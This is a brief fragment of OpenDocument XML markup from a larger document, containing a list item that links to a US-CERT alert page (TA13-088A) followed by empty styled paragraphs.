          <text:p text:style-name="P32"><text:a xlink:href="https://www.us-cert.gov/ncas/alerts/TA13-088A"><text:span text:style-name="T81">https://www.us-cert.gov/ncas/alerts/TA13-088A</text:span></text:a><text:span text:style-name="T82"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P33"><text:span text:style-name="T83"/></text:p>
      <text:p text:style-name="P34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  <text:p text:style-name="P35"><text:span text:style-name="T8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